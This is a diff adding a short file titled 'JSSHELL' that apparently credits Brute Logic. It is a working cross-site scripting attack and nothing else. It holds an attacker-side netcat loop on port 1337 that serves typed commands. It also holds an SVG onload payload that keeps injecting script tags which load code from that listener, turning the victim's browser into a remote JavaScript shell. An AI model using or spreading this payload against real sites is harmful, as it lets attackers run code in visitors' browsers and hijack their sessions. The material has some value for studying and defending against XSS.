@@ -1,0 +1,11 @@
+JSSHELL
+
+Attacker : while :; do printf "J$ "; read c; echo $c | nc -lp 1337 > /dev/null;done
+
+
+
+
+payload : <svg/onload=setInterval(function(){d=document;z=d.createElement("script");z.src="//127.0.0.1:1337";d.body.appendChild(z)},0)>
+
+
+Thx Bro Brute Logic 
